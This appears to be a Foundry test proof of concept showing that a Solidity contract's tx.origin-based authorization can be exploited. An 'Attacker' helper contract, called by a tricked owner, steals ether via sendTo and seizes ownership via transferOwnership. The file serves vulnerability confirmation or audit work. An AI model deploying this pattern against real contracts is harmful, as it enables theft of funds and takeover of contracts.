// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/mycontract.sol";

contract TxOriginPocTest is Test {
    MyContract target;
    Attacker attacker;
    
    address owner = makeAddr("owner");
    address attackerEOA = makeAddr("attacker");
    address receiver = makeAddr("receiver");

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.startPrank(owner, owner);
        target = new MyContract();
        vm.stopPrank();
        
        vm.deal(address(target), 10 ether);  // Fund the target contract
        vm.prank(attackerEOA);
        attacker = new Attacker();
    }

    function testAttackViaSendTo() public {
        uint initialContractBalance = address(target).balance;
        uint stealAmount = 1 ether;
        
        // Owner is tricked into calling attacker contract
        vm.prank(owner, owner);
        attacker.executeMaliciousSend(address(target), attackerEOA, stealAmount);
        
        // Validate theft occurred
        assertEq(
            attackerEOA.balance,
            stealAmount,
            "Attacker received funds"
        );
        assertEq(
            address(target).balance,
            initialContractBalance - stealAmount,
            "Target contract balance decreased"
        );
    }

    function testAttackViaTransferOwnership() public {
        console.log("--- BEFORE-Trigger State ---");
        uint balanceBefore = target.getContractBalance();
        uint recipientBalancesBefore = target.recipientBalances(attackerEOA);
        uint totalTransfersBefore = target.totalTransfers();

        console.log("Contract balance before:", balanceBefore);
        console.log("Recipient balance before:", recipientBalancesBefore);
        console.log("Total transfers before:", totalTransfersBefore);
        console.log("Expected owner before:", owner);

        console.log("--- Trigger transferOwnership ---");
        // Transfer ownership to attacker
        vm.prank(owner, owner);
        attacker.executeMaliciousTransferOwnership(address(target), attackerEOA);

        console.log("--- AFTER-Trigger State ---");
        uint balanceAfter = target.getContractBalance();
        uint recipientBalancesAfter = target.recipientBalances(attackerEOA);
        uint totalTransfersAfter = target.totalTransfers();

        console.log("Contract balance after:", balanceAfter);
        console.log("Recipient balance after:", recipientBalancesAfter);
        console.log("Total transfers after:", totalTransfersAfter);
        console.log("Expected owner after:", attackerEOA);

        // Verify storage state unchanged
        bool storageUnchanged = (balanceAfter == balanceBefore) &&
                                (recipientBalancesAfter == recipientBalancesBefore) && 
                                (totalTransfersAfter == totalTransfersBefore);
        console.log("Storage unchanged:", storageUnchanged);

        console.log("--- Authorization Tests ---");
        // Test new owner (attacker) can call
        vm.prank(attackerEOA, attackerEOA);
        bool attackerSuccess;
        try target.sendTo(attackerEOA, 0) {
            attackerSuccess = true;
            console.log("sendTo by attacker: SUCCESS");
        } catch {
            attackerSuccess = false;
            console.log("sendTo by attacker: FAILED");
        }

        // Test old owner (owner) cannot call
        vm.prank(owner, owner);
        bool ownerFailure;
        try target.sendTo(owner, 0) {
            console.log("sendTo by owner: SUCCESS (SHOULD FAIL)");
            ownerFailure = false;
        } catch {
            console.log("sendTo by owner: REVERTED");
            ownerFailure = true;
        }

        bool ownershipChanged = attackerSuccess && ownerFailure;
        if (ownershipChanged) {
            console.log("Vulnerability Exists: Ownership transfer and authorization change confirmed");
        } else {
            console.log("Vulnerability not Exist: Ownership transfer failed");
        }
    }
}

// Malicious helper contract
contract Attacker {
    function executeMaliciousSend(address _target, address _receiver, uint _amount) external {
        MyContract(_target).sendTo(_receiver, _amount);
    }

    function executeMaliciousTransferOwnership(address _target, address _newOwner) external {
        MyContract(_target).transferOwnership(_newOwner);
    }
}